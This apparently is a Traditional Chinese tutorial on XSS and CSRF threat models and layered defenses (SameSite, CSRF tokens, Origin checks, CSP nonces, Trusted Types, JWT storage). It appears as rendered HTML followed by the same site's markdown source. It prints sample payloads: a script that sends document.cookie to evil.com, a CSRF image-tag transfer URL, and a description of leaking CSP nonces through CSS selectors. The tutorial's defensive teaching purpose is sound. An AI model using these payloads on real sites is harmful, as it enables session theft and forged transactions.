response，所以它也就無法偽造這個 token。</td><td>沒用。XSS 直接從 DOM 讀出 token 一起送。</td></tr><tr><td><code>Origin</code> / <code>Referer</code> 檢查</td><td>Server</td><td>單子上寫著它是從哪個網站遞出來的。瀏覽器會在 POST request 加上 <code>Origin</code> header。送到 <code>/transfer</code> 的 request 要是帶著 <code>Origin: https://evil.com</code>，就拒絕。</td><td>沒用。XSS 送出的 request 帶的是你真正的 <code>Origin</code>。</td></tr><tr><td>照 HTTP method 的語意走</td><td>Server</td><td>GET 永遠不改變狀態。圖片 tag 只能發 GET，發不了 POST，攻擊者就得多寫一點東西。</td><td>沒用。XSS 什麼 method 都能用。</td></tr><tr><td>不用 cookie</td><td>架構</td><td>JWT 放在 <code>Authorization</code> header。不會被自動帶上，也就沒有 CSRF 的問題。</td><td>沒用，而且更糟。放在 <code>localStorage</code> 的 JWT，XSS 一行就能讀走。</td></tr><tr><td>敏感操作前重新驗證 / MFA</td><td>Server + Client + 使用者</td><td>開保險箱之前，管理員先打電話問你本人。在重要操作前重新輸入密碼、輸入驗證器的一次性密碼（TOTP），或按一下安全金鑰（WebAuthn）。</td><td><strong>部分有用。</strong> XSS 自己變不出你的密碼，也沒辦法替你按金鑰。但頁面在它手上，它可以跳出一個看起來很正常的提示，等你自己填。這時它得先騙到你配合，沒辦法再悄悄完成。</td></tr></tbody></table>
+<hr>
+<h2>為什麼 XSS 比較要緊</h2>
+<p>XSS 一進來，所有常見的 CSRF 防線都會失效，上面那張表的最後一欄就是這個結果。OWASP 的 CSRF cheat sheet 用一句話講完：「Cross-Site Scripting (XSS) can defeat all CSRF mitigation techniques!」重新驗證是 XSS 進來之後唯一還有作用的一層，因為 XSS 沒有你的密碼跟金鑰，得想辦法讓你自己交出來。</p>
+<p>實際的優先順序：</p>
+<ol>
+<li><strong>先防 XSS。</strong> 框架的自動 escape、CSP、存進來的內容先清過、nosniff，再用 <code>HttpOnly</code> 限制損害。</li>
+<li><strong>再疊上 CSRF 的防線。</strong> SameSite、token、Origin 檢查。這些只有在 XSS 已經防住的前提下才有意義。</li>
+<li><strong>高風險的操作，加上重新驗證或 MFA。</strong> XSS 成功之後它還有點用，攻擊者得騙你按下確認，沒辦法自己動手。</li>
+</ol>
+<hr>
+<h2>依架構一步步補強</h2>
+<p>一樣的防線，依架構組合起來。每一條路線都從最陽春的版本開始，一次加一層。</p>
+<details>
+<summary>一步步補強 cookie session 的 app</summary>
+<p>防 XSS 的三樣東西要先做，後面稱為地基：CSP nonce、框架的自動 escape、nosniff。XSS 一進來，SameSite、CSRF token、Origin 檢查都會失效，<code>HttpOnly</code> 也只能限制損害。</p>
+<p>既有的 app 要補強，可以照下面第 0 步到第 6 步的順序。CSP nonce 要改每個 template、檢查每支第三方 script，是最花工夫的一步，所以排到第 4 步，讓便宜的先做。下表列出每一層的成本跟防禦價值：</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>層</th><th>成本</th><th>價值</th></tr></thead><tbody><tr><td><code>HttpOnly</code> + <code>Secure</code></td><td>各一行</td><td>限制損害，但不會阻止攻擊</td></tr><tr><td><code>nosniff</code></td><td>一行</td><td>擋掉一條 XSS 路徑：上傳的檔案回傳時的 <code>Content-Type</code> 如果不是 JavaScript，用 <code>&#x3C;script src></code> 載入也不會執行。從其他地方進來的 XSS 不受影響</td></tr><tr><td><code>SameSite</code></td><td>一行</td><td>攔下其他網站發起的典型 CSRF；從你自己的 subdomain 發起的攔不下來，其他攻擊也沒用</td></tr><tr><td>CSRF token</td><td>每個 form 都要接</td><td>XSS 一進來就失效</td></tr><tr><td>CSP nonce</td><td>真正要排時程的工作：server 每個 request 產生一個 nonce，每個 template 都要放進去，每支第三方 script 都要檢查過。漏掉一個，頁面就壞了</td><td>整組裡價值最高的。它讓塞進來的 script 根本不會執行，而 XSS 正是能穿過其他每一層的那種攻擊</td></tr></tbody></table>
+<p>既有的 app 這樣排，是為了補強時不把東西弄壞。昂貴但價值高的 CSP，等排得出時間再做。</p>
+<p><strong>0. 什麼都沒設的 cookie。</strong> 全部暴露在外：XSS 讀得到，CSRF 用得到，還用明文傳送。</p>
+<pre><code>Set-Cookie: session=abc123
+</code></pre>
+<p><strong>1. 先把 cookie 鎖起來，順手加上那個免費的 header。</strong> <code>HttpOnly</code> 讓 JS 讀不到它，<code>Secure</code> 讓它不走明文的 HTTP。<code>nosniff</code> 只要一行，放在這一批一起做，雖然它防的是第 4 步講的 script 執行那一層。</p>
+<pre><code>Set-Cookie: session=abc123; HttpOnly; Secure; Path=/
+X-Content-Type-Options: nosniff
+</code></pre>
+<p>XSS 沒辦法再把 cookie 傳出去了。但它還是可以在頁面裡<em>使用</em>這個 session，所以這一步只是減少損害，問題還在。</p>
+<p><strong>2. 用 <code>SameSite</code> 攔下典型的 CSRF。</strong> 跨站的 sub-resource request（就是 <code>&#x3C;img src="bank.com/transfer"></code> 那一招）跟跨站的 form POST，都不會再帶 cookie。Chrome 本來就把沒寫的 cookie 當成 <code>Lax</code>，但明確寫出來，也能關掉 Chrome 那兩分鐘的 POST 例外，而且 Firefox 跟 Safari 也會照一樣的規則走。</p>
+<pre><code>Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
+</code></pre>
+<p>管理後台跟跟錢有關的 endpoint 用 <code>SameSite=Strict</code>。</p>
+<p><strong>3. 在會改變狀態的 request 上加 CSRF token</strong>，因為 <code>SameSite</code> 有漏洞。「site」指的是 scheme 加上可註冊網域（registrable domain），所以 <code>https://evil.bank.com</code> 跟 <code>https://bank.com</code> 是同一個 site。如果有一個 subdomain 落在別人手上（被接管的廢棄 subdomain、放使用者內容的 host），它能通過每一種 <code>SameSite</code> 檢查。實測時，<code>evil.bank.test</code> 上的 <code>&#x3C;img></code> 跟 form POST，在 Chrome 跟 Firefox 都帶上了 <code>bank.test</code> 標成 <code>Strict</code> 的 cookie。不過 <code>Origin</code> header 寫的還是 <code>https://evil.bank.test</code>，所以第 5 步在這裡用得上。另外，別的網站連到你的某個 GET 網址時，<code>Lax</code> 還是會帶 cookie，所以會改變狀態的 GET 一樣有風險。</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="html" data-theme="github-dark github-light"><code data-language="html" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">&#x3C;</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">form</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> action</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">=</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">"/transfer"</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> method</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">=</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">"POST"</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">></span></span>
+<span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">  &#x3C;</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">input</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> type</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">=</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">"hidden"</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> name</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">=</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">"csrf_token"</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> value</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">=</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">"{{ csrfToken }}"</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">></span></span>
+<span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">&#x3C;/</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">form</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">></span></span></code></pre></figure>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// server，收到 POST 時。兩邊都要先確認有值：undefined !== undefined 是 false，</span></span>
+<span data-line=""><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// 不檢查的話，session 沒有 token、request 也沒帶 token，就會直接通過。</span></span>
+<span data-line=""><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">if</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> (</span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">!</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">session.csrfToken </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">||</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> req.body.csrf_token </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">!==</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> session.csrfToken) </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">return</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> res.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">status</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#79B8FF;--shiki-light:#005CC5">403</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">).</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">end</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">()</span></span></code></pre></figure>
+<p><strong>4. 把地基寫出來。</strong> CSP nonce 跟框架的自動 escape（<code>nosniff</code> 第 1 步已經加了）。這就是開頭講的地基。如果你是新專案，做到這裡時這一項早就完成了，前面幾步是之後才補上的便宜基本功。</p>
+<pre><code>Content-Security-Policy: script-src 'self' 'nonce-RANDOM'
+</code></pre>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="jsx" data-theme="github-dark github-light"><code data-language="jsx" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">&#x3C;</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">div</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">>{userInput}&#x3C;/</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">div</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">>   </span><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// 安全，框架會幫你 escape</span></span>
+<span data-line=""><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// 永遠不要把使用者的資料丟給 dangerouslySetInnerHTML / v-html / innerHTML</span></span></code></pre></figure>
+<p><strong>5. 拒絕外來的 <code>Origin</code></strong>，用在會改變狀態的路由上。便宜的第二層。實測時，瀏覽器在每個 POST 上都送了 <code>Origin</code>，同 origin 的 form 跟 <code>fetch</code> 也一樣，而一般的 GET 沒有送，所以要在會改變狀態的 method 上檢查。POST 沒帶 <code>Origin</code>，不代表它就是你自己送的，這段檢查也會拒絕它。</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">if</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> (req.method </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">===</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62"> 'POST'</span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49"> &#x26;&#x26;</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> req.headers.origin </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">!==</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62"> 'https://bank.com'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">) </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">return</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> res.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">status</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#79B8FF;--shiki-light:#005CC5">403</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">).</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">end</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">()</span></span></code></pre></figure>
+<p><strong>6. 危險的操作要重新驗證。</strong> 轉帳、改 email、刪帳號，都要重新輸入密碼或按一下安全金鑰。XSS 進來之後，只剩這一層還需要你本人點頭。</p>
+</details>
+<details>
+<summary>補強 JWT 的 app，先打地基</summary>
+<p>動 token 之前，先把地基打好。token 放在哪裡（下面的 A、B、C）只能在 XSS 已經進來之後減少損害，只有一層能一開始就不讓 XSS 進來，所以它排第一。</p>
+<p><strong>D. 地基：讓 XSS 根本不會執行。</strong> CSP nonce、框架的自動 escape、nosniff，敏感操作前重新驗證。一個把 token 放在 <code>localStorage</code>、但 CSP 設得很完整的 app，可能比 token 放得很講究、卻沒有 CSP 的 app 安全，因為後者還是讓塞進來的 script 執行。這是唯一能不讓攻擊者進來、而不只是減少損害的一層。</p>
+<pre><code>Content-Security-Policy: script-src 'self' 'nonce-RANDOM'
+X-Content-Type-Options: nosniff
+</code></pre>
+<p>接著決定 token 放哪裡。這幾項用字母編號，不像前面 cookie 那條用數字，因為只能選一個，不是全部都做。A、B、C 都在回答「token 放在哪裡」這個問題，後一個取代前一個。能做到哪一個，就選最後面那個。</p>
+<p><strong>A. Token 放 <code>localStorage</code>。</strong> 最糟。XSS 一行就偷走，而且在過期前能從任何裝置重放。</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">localStorage.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">setItem</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'token'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">, jwt)   </span><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// 不要這樣做</span></span></code></pre></figure>
+<p><strong>B. Token 放記憶體。</strong> 一個 module 變數或 store，不寫進任何儲存空間。分頁一關它就消失，之後才執行的 XSS 什麼都找不到。但分頁開著的時候執行的 XSS 還是讀得到，也能把它傳出去，攻擊者拿到的 token 在過期前都能用。取代 A。</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">let</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> accessToken </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">=</span><span style="--shiki-dark:#79B8FF;--shiki-light:#005CC5"> null</span></span>
+<span data-line=""><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">function</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> setToken</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#FFAB70;--shiki-light:#E36209">t</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">) { accessToken </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">=</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> t }</span></span></code></pre></figure>
+<p><strong>C. 短效的 access token 放記憶體，refresh token 放 <code>HttpOnly</code> cookie。</strong> access token 在記憶體變數裡只用 5 到 15 分鐘；refresh token 放在 JS 永遠讀不到的地方。取代 B。</p>
+<pre><code>Set-Cookie: refresh=...; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh
+</code></pre>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// 背景更新 token，瀏覽器會自己帶上 refresh cookie</span></span>
+<span data-line=""><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">const</span><span style="--shiki-dark:#79B8FF;--shiki-light:#005CC5"> res</span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49"> =</span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49"> await</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> fetch</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'/auth/refresh'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">, { credentials: </span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'include'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> })</span></span>
+<span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">accessToken </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">=</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> (</span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">await</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> res.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">json</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">()).accessToken</span></span></code></pre></figure>
+<p>XSS 讀不到 refresh token，但上面這兩行它也能照跑。實測時，頁面上的一段 script 呼叫了三次 <code>/auth/refresh</code>，瀏覽器每次都自動帶上 refresh cookie，script 也每次都讀到新的 access token，兩個瀏覽器都一樣。前面 <code>HttpOnly</code> 那節也是這樣，cookie 的值讀不到，request 照樣帶著它出去。所以只要分頁開著，payload 每幾分鐘就能拿一個新的 token 傳出去。分頁關掉以後 payload 就停了，最後傳出去的那個 access token 幾分鐘內就過期，refresh token 則從頭到尾沒離開過瀏覽器。</p>
+<p>refresh cookie 會被自動帶上，所以 <code>/auth/refresh</code> 自己就有 CSRF 的問題。在這個 cookie 上設 <code>SameSite=Strict</code>，其他網站發起的 request 就不會帶它；但兄弟 subdomain 屬於同一個 site，還是會帶，所以這個 endpoint 也要檢查 <code>Origin</code>。Strict 不會打斷正常流程。實測時，使用者從別的網站點連結進來，頁面接著呼叫 <code>/auth/refresh</code>，這個 request 有帶上 <code>Strict</code> 的 cookie，因為它是從你自己的頁面發出的。這樣一來，CSRF 要處理的範圍就從整個 app 縮到一個 endpoint。</p>
+<p>最穩的 JWT app 是 D 加 C：不讓 XSS 進來。萬一進來了，受害者的分頁開著多久，它就能透過 <code>/auth/refresh</code> 拿新的 token 拿多久。不過有了 C，分頁關掉幾分鐘後，它傳出去的 token 都會失效。只要驗證資訊放在 header 裡，就不需要 CSRF token，因為 JWT 不會被自動帶上。還在用 cookie 驗證的路由，就是 cookie app，照 cookie app 的方式防。</p>
+</details>
+<hr>
+<h2>參考資料</h2>
+<ul>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP XSS Prevention Cheat Sheet</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP CSRF Prevention Cheat Sheet</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy (MDN)</a></li>
+<li><a href="https://web.dev/articles/samesite-cookies-explained">SameSite cookies explained (web.dev)</a></li>
+<li><a href="https://web.dev/articles/trusted-types">Trusted Types (web.dev)</a></li>
+<li><a href="https://w3c.github.io/webappsec-csp/">Content Security Policy Level 3 (W3C)</a></li>
+<li><a href="https://html.spec.whatwg.org/multipage/urls-and-fetching.html#nonce-attributes">HTML Standard: nonce attributes</a></li>
+<li><a href="https://www.chromium.org/updates/same-site/">SameSite updates (Chromium)</a></li>
+</ul>15:T78b5,
+你登入了 `bank.com`，接著在另一個分頁打開 `evil.com`。那一頁裡有這一行：
+
+```html
+<img src="https://bank.com/transfer?to=evil&amount=1000">
+```
+
+瀏覽器會對 `bank.com` 發出一個 request。過去好幾年，不管是哪一頁發起的，只要 request 是送往 `bank.com`，瀏覽器就會把 `bank.com` 的 session cookie 一起帶上。session cookie 是登入時 `bank.com` 存在瀏覽器裡的一小段值，server 讀到它，就知道這個 request 是你送的。於是這筆轉帳成立了。
+
+這就是 CSRF（Cross-Site Request Forgery，跨站請求偽造）。你什麼都沒點，攻擊者只是騙瀏覽器送出一個 request，就借用了你已經登入的 session。
+
+那這個 `<img>` 現在還有用嗎？大多沒有了。在本機用 HTTPS server 扮演 `bank.test` 跟 `evil.test` 測試的話，Chrome for Testing 156 只送出標了 `SameSite=None` 的 cookie，因為從 Chrome 80（2020 年陸續上線）開始，沒寫 `SameSite` 的 cookie 會被當成 `SameSite=Lax`，別的網站的圖片發出的 request 就不會帶它。Firefox 159 一個 cookie 都沒送，因為它的 Total Cookie Protection（2022 年 6 月起預設開啟）會在 `evil.test` 裡另外給 `bank.test` 一個空的 cookie jar。Safari 則是從 13.1（2020 年 3 月，WebKit 的公告）起，預設就不在這種跨站 request 上帶 cookie。
+
+不過，要是把 `<img>` 換成一個會自己送出 POST 到 `bank.test/transfer` 的 form，有兩種情況 cookie 又會被帶上。Firefox 會送出沒寫 `SameSite` 的 cookie，因為 Firefox 沒有把預設值改成 `Lax`。Chrome 也會送，但只限 cookie 設下之後的兩分鐘內，這是 Chrome 稱為「Lax + POST」的暫時例外（[Chromium 的 SameSite 更新紀錄](https://www.chromium.org/updates/same-site/)）。登入 130 秒後再送一次，Chrome 就沒帶了。標了 `SameSite=Lax` 或 `Strict` 的 cookie，上面這幾種情況都沒被送出。所以 CSRF 能用的路比以前少，但沒寫 `SameSite` 的 cookie 還是有風險。
+
+---
+
+再看另一個情境。你逛到 `forum.com`，讀到某人的留言，留言內容是：
+
+```html
+<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>
+```
+
+如果 `forum.com` 把留言原封不動當成 HTML 放進頁面，沒做 escape（把 `<` 換成 `&lt;`，讓它顯示成文字），這段 script 就會在 `forum.com` 的 origin 裡執行。origin 是 scheme、host 跟 port 三者合起來，這裡就是 `https://forum.com`。瀏覽器把每個 origin 的資料分開放，而在某個 origin 裡跑的程式，那個 origin 擁有的東西它都碰得到。所以這段 script 能讀到頁面的 DOM、cookie（標了 `HttpOnly` 的除外）跟 localStorage，攻擊者就拿到了你的 session。
+
+這就是 XSS（Cross-Site Scripting，跨站腳本攻擊）。攻擊者塞進來的程式，執行起來就像是 `forum.com` 自己寫的。
+
+---
+
+把你登入的網站想成一棟大樓吧。server 是大樓的管理員，你在裡面有一戶。瀏覽器是幫你跑腿的人，身上帶著你那一戶的鑰匙，也就是 session cookie。每張單子就是一個 request。跑腿的人把單子送進大樓時會亮出鑰匙，管理員看到鑰匙，就照單子上寫的辦。
+
+兩個攻擊者站的位置不一樣。CSRF 的攻擊者在**外面**。他沒有鑰匙，只能從別的網站的頁面遞一張假單子給跑腿的人，而跑腿的人照樣亮出你的鑰匙，管理員也就照辦了。XSS 的攻擊者則是把單子混進**你自己的頁面裡**。網站把別人寫的留言直接當成 HTML 放進你的頁面，就等於在你的單子本上留了一個欄位給陌生人填。從那個欄位寫出去的單子，跑腿的人跟管理員都分不出是不是你寫的，而且填那個欄位的人，還看得見你單子本上的每一頁。
+
+---
+
+## 兩種攻擊，兩種威脅模型
+
+**XSS**：<mark>不是我寫的程式碼，在我的 origin 裡執行。</mark>攻擊者把 payload 放進會被存起來的內容（留言、個人資料欄位）、會被反射回頁面的 URL 參數，或是透過 DOM 操作塞進來。一旦執行，它就有這個 origin 的全部權限，能讀沒標 HttpOnly 的 cookie、localStorage 跟頁面狀態，也能用使用者的身分送 request。它利用了頁面對使用者內容的信任。
+
+**CSRF**：<mark>我的瀏覽器送出了一個我沒打算送的 request。</mark>攻擊者掌握另一個 origin，在頁面上嵌入某個東西（圖片、form、fetch），觸發一個送往目標網站的 request。只要 cookie 的設定允許，瀏覽器就會自動帶上目標網站的 cookie，而 server 光看 cookie，分不出這個 request 是不是你本來就想送的。它利用了瀏覽器會自動帶 cookie 這件事。
+
+---
+
+## 登入方式決定了你要面對哪一種威脅
+
+app 怎麼驗證使用者，決定了哪一種威脅比較嚴重。
+
+**Cookie session**（server 設一個 session cookie，之後瀏覽器送 request 到這個 server，都自動帶上它）：
+
+- 會被 CSRF 攻擊。別的網站發起的 request 可能會帶著你的 cookie，除非 `SameSite`（後面會講）把它攔下來。
+- XSS 一樣危險。它能讀沒標 HttpOnly 的 cookie，也能用完整的 session 送 same-origin request。
+
+**Token 驗證**（JWT，也就是 JSON Web Token，或類似的字串，由你自己的 JavaScript 放進每個 request 的 `Authorization` header）：
+
+- CSRF 大致上就不成問題了。沒有 cookie 會被自動帶上，偽造的 request 不會帶著憑證。
+- XSS 變成最主要的威脅。要是 token 放在 `localStorage`，XSS 的 payload 讀出來之後，就能在任何裝置上冒充這個使用者，直到 token 過期。
+
+現代的 SPA 常用 token，server 產生頁面的 app 通常用 cookie。
+
+---
+
+## XSS 的防線，一層一層看
+
+| 層 | 誰負責 | 做什麼 |
+|---|---|---|
+| Output encoding | Client | 用框架的插值語法（`{value}`），別再動不動就用 `innerHTML`、`dangerouslySetInnerHTML`、`v-html`。 |
+| Sanitization | Client | 非得顯示使用者寫的 HTML 時，先交給 DOMPurify，它會把 script 跟 event handler 拿掉。不要自己寫。 |
+| Content Security Policy | Server | `script-src 'self' 'nonce-RANDOM'`。一個 response header，列出哪些 script 可以執行。不符合的，瀏覽器一律拒絕。 |
+| HttpOnly cookie | Server | `Set-Cookie: ...; HttpOnly`。JS 讀不到它，可是 XSS 送出的 request 還是會帶上它，見下面〈HttpOnly 只能減少損害，不能防止 XSS〉。 |
+| 存進資料庫的內容先清過 | Server | 寫入時清一次，輸出時也清一次，以免有些內容在寫入檢查加上之前就已經存進去了。 |
+| `X-Content-Type-Options` | Server | `nosniff`。瀏覽器不再從檔案的位元組去猜它是什麼，所以沒標類型的檔案不會被猜成網頁，沒標成 JavaScript 的檔案也不能當 script 載入。 |
+| Trusted Types | Client + Server | 一個 CSP 指令（`require-trusted-types-for 'script'`）。一般字串直接 assign 給 `innerHTML` 這類 sink 會丟出錯誤。policy 是你註冊的一個函式，例如 `trustedTypes.createPolicy('app', { createHTML: s => DOMPurify.sanitize(s) })`，呼叫 `policy.createHTML(str)` 時，瀏覽器把函式回傳的字串包成一個 `TrustedHTML` 物件，sink 只收這種物件。要是 policy 寫成 `s => s`，任何字串都能原樣進去。 |
+
+sink 指的是會把字串變成 markup 或程式碼的 API，例如 `innerHTML`、`outerHTML`、`document.write`、`eval`。表格前兩列就處理掉大部分的問題，其餘幾層是額外的保險。
+
+Trusted Types 是在那一行程式真的執行時才抓到錯，不是在 build 的時候。Chrome for Testing 156 丟出 `TypeError: ... This document requires 'TrustedHTML' assignment`，Firefox 159 丟出 `Sink type mismatch violation blocked by CSP`。所以要有測試跑到那一行，才會看到這個錯誤。支援的版本是 Chrome 83、Firefox 148、Safari 26。
+
+CSP 的 nonce 是只用一次的隨機值。設了 `script-src 'self' 'nonce-abc123'` 之後，server 會在每個正當的 `<script>` tag 上加 `nonce="abc123"`，瀏覽器只執行帶著這個值的 inline script，另外加上從自己 origin 載入的 script 檔，這是 `'self'` 允許的。攻擊者塞進來的 script 沒有這個值，而且 server 每次回應都換一個新的 nonce，所以在舊頁面上看到的值，到了下一頁就沒用了。
+
+<details>
+<summary>深入：XSS 為什麼偽造不了 nonce</summary>
+
+攻擊者如果只能塞 markup 進來，例如一則留言，他得在頁面送出之前就把 nonce 寫進自己的 `<script>`。可是 nonce 是 server 每次回應時才產生的，他沒辦法事先知道。
+
+那從頁面上讀出來呢？CSP 用 response header 送的話，瀏覽器會把每個 `nonce` attribute 清成空字串，只有已經在執行的 script 能從 `.nonce` 這個 property 讀到原本的值：
+
+```js
+document.querySelector('script').getAttribute('nonce')  // ""
+document.querySelector('script').nonce  // "abc123"
+```
+
+清掉 attribute，是為了不讓塞進來的 CSS 讀到 nonce。攻擊者的 CSS 可以替每個可能的字元各寫一條規則，`script[nonce^="a"]`、`script[nonce^="b"]`……，每條載入一張網址不同的背景圖。nonce 如果是 `a` 開頭，`script[nonce^="a"]` 就會生效，攻擊者的 server 就會收到 `a` 對應的背景圖 request。只要頁面沒有重新載入，nonce 就不會變。塞進來的 CSS 會用 `@import` 再向攻擊者的 server 要下一份 CSS，server 先不回，等收到圖的 request、知道第一個字元之後，才回一份猜第二個字元的規則，例如 `script[nonce^="ab"]`。這樣一直往下猜，就能拼出整個 nonce。attribute 清成空字串之後，這些規則都不會生效。Chrome for Testing 156 跟 Firefox 159 都會清掉。不過如果 CSP 是用 `<meta>` 送的，attribute 會留著，這招就還有機會。
+
+如果 nonce 寫死或亂數太短，攻擊者就可能猜中。
+
+沒有 `'unsafe-eval'` 的話，CSP 會封鎖 `eval`。加了它之後，如果頁面原本就有一段 script 會把網址參數丟進 `eval`，攻擊者只要在網址參數裡放自己的程式碼，再騙使用者打開這個網址，他的程式碼就會被執行。
+
